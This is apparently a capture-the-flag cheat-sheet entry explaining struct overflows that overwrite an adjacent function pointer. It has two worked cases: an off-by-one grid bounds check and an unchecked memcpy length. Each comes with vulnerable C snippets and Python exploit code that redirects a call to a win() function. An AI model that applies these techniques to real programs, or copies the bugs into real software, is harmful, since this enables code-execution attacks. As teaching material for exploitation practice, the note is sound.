# Struct Overflow

**When:** A struct has an array (or small buffer) followed by a function pointer. Overflowing the array overwrites the pointer, and calling the function gives code execution.

**Prerequisites:** No PIE (or PIE leak) to know the target function address.

## Off-by-one to Function Pointer

**How it works:** The bounds check allows writing one past the array end (`x >= 0 && x <= 8` when the array is `[8][8]`). Writing at index 8 hits the `act` function pointer that immediately follows the grid.

```c
typedef struct { char grid[8][8]; void (*act)(void); } Game;
if ((x >= 0 && x <= 8) && (y >= 0 && y < 8))  // bug: <= 8
    g.grid[y][x] = ch;  // x=8 writes into the act pointer
```

```python
# Write win() address byte-by-byte through x=8
for i, b in enumerate(p64(win_addr)):
    place(x=8, y=i, byte=b)
trigger_act()  # now calls win() instead of crashing
```

## memcpy Overflow to Function Pointer

**How it works:** `memcpy` copies user-controlled length bytes into a fixed-size name buffer. Writing more than 16 bytes overflows into the adjacent function pointer in the struct, which is called immediately after with the name buffer as argument.

```c
struct S { char names[4][16]; op_t ops[4]; };
memcpy(s.names[idx], tmp, len);  // len > 16 -> overflows into ops[idx]
s.ops[idx](s.names[idx]);        // calls s.names[idx] via our pointer!
```

```python
payload = b"A"*16 + p64(win_addr)  # fill names[1] (16B) + overwrite ops[1]
rename(idx=1, len=len(payload), data=payload)
do(idx=1)  # calls ops[1](names[1]) which is now win()
```
